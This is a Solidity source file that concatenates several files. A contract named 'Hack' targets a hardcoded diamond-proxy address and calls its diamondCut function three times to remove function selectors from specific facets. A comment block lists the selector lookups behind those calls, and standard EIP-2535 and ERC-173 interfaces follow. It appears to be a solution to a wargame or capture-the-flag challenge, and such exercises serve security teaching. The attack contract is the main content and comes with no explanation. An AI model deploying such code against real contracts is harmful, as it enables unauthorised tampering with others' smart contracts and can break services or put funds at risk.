// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import "./interfaces/IDiamondCut.sol";
import "./interfaces/IDiamondLoupe.sol";
import "./interfaces/IERC173.sol";

contract Hack {
    IDiamondCut iDiamondCut;
    IDiamondLoupe iDiamondLoupe;

    constructor() {
        iDiamondCut = IDiamondCut(0x8f90dE7cB198b1dEf8E2E58D67B8f125F1D4B61E);
        iDiamondLoupe = IDiamondLoupe(0x8f90dE7cB198b1dEf8E2E58D67B8f125F1D4B61E);
    }

    function hackF() public {
        bytes4[] memory arrayF = new bytes4[](1);
        arrayF[0] = 0x82d94d56;
        IDiamondCut.FacetCut[] memory facetCuts = new IDiamondCut.FacetCut[](1);
        facetCuts[0] = IDiamondCut.FacetCut(
            address(0xB4FeA7B2D91A1F1f8d3076E90E9b067650E2c4d6),
            IDiamondCut.FacetCutAction.Remove,
            arrayF
        );
        bytes memory _calldata = abi.encodeWithSignature("diamondCut(FacetCut[],address)", facetCuts, address(0x8f90dE7cB198b1dEf8E2E58D67B8f125F1D4B61E));
        iDiamondCut.diamondCut(facetCuts, 0x8f90dE7cB198b1dEf8E2E58D67B8f125F1D4B61E, _calldata);

        arrayF[0] = 0x748d99ad;
        facetCuts[0] = IDiamondCut.FacetCut(
            address(0x47d4493284FdA342Efd42AF279190a03aA8ECF85),
            IDiamondCut.FacetCutAction.Remove,
            arrayF
        );
        _calldata = abi.encodeWithSignature("diamondCut(FacetCut[],address)", facetCuts, address(0x47d4493284FdA342Efd42AF279190a03aA8ECF85));
        iDiamondCut.diamondCut(facetCuts, 0x8f90dE7cB198b1dEf8E2E58D67B8f125F1D4B61E, _calldata);

        arrayF[0] = 0x3ebdd9c9;
        facetCuts[0] = IDiamondCut.FacetCut(
            address(0xF5c5C21bF447e9D40262839ffa9e65357C55672c),
            IDiamondCut.FacetCutAction.Remove,
            arrayF
        );
        _calldata = abi.encodeWithSignature("diamondCut(FacetCut[],address)", facetCuts, address(0xF5c5C21bF447e9D40262839ffa9e65357C55672c));
        iDiamondCut.diamondCut(facetCuts, 0x8f90dE7cB198b1dEf8E2E58D67B8f125F1D4B61E, _calldata);
    }

}

/*
[email protected] using-diamonds % 0x82d94d56
0xB4FeA7B2D91A1F1f8d3076E90E9b067650E2c4d6

[email protected] using-diamonds % 0x748d99ad
0x47d4493284FdA342Efd42AF279190a03aA8ECF85

[email protected] using-diamonds % 0x3ebdd9c9
0xF5c5C21bF447e9D40262839ffa9e65357C55672c
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

interface IDiamondCut {
    enum FacetCutAction {Add, Replace, Remove}
    // Add=0, Replace=1, Remove=2

    struct FacetCut {
        address facetAddress;
        FacetCutAction action;
        bytes4[] functionSelectors;
    }

    /// @notice Add/replace/remove any number of functions and optionally execute
    ///         a function with delegatecall
    /// @param _diamondCut Contains the facet addresses and function selectors
    /// @param _init The address of the contract or facet to execute _calldata
    /// @param _calldata A function call, including function selector and arguments
    ///                  _calldata is executed with delegatecall on _init
    function diamondCut(
        FacetCut[] calldata _diamondCut,
        address _init,
        bytes calldata _calldata
    ) external;

    event DiamondCut(FacetCut[] _diamondCut, address _init, bytes _calldata);
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

// A loupe is a small magnifying glass used to look at diamonds.
// These functions look at diamonds
interface IDiamondLoupe {
    /// These functions are expected to be called frequently
    /// by tools.

    struct Facet {
        address facetAddress;
        bytes4[] functionSelectors;
    }

    /// @notice Gets all facet addresses and their four byte function selectors.
    /// @return facets_ Facet
    function facets() external view returns (Facet[] memory facets_);

    /// @notice Gets all the function selectors supported by a specific facet.
    /// @param _facet The facet address.
    /// @return facetFunctionSelectors_
    function facetFunctionSelectors(address _facet) external view returns (bytes4[] memory facetFunctionSelectors_);

    /// @notice Get all the facet addresses used by a diamond.
    /// @return facetAddresses_
    function facetAddresses() external view returns (address[] memory facetAddresses_);

    /// @notice Gets the facet that supports the given selector.
    /// @dev If facet is not found return address(0).
    /// @param _functionSelector The function selector.
    /// @return facetAddress_ The facet address.
    function facetAddress(bytes4 _functionSelector) external view returns (address facetAddress_);
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

/// @title ERC-173 Contract Ownership Standard
///  Note: the ERC-165 identifier for this interface is 0x7f5828d0
/* is ERC165 */
interface IERC173 {
    /// @dev This emits when ownership of a contract changes.
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /// @notice Get the address of the owner
    /// @return owner_ The address of the owner.
    function owner() external view returns (address owner_);

    /// @notice Set the address of the new owner of the contract
    /// @dev Set _newOwner to address(0) to renounce any ownership.
    /// @param _newOwner The address of the new owner of the contract
    function transferOwnership(address _newOwner) external;
}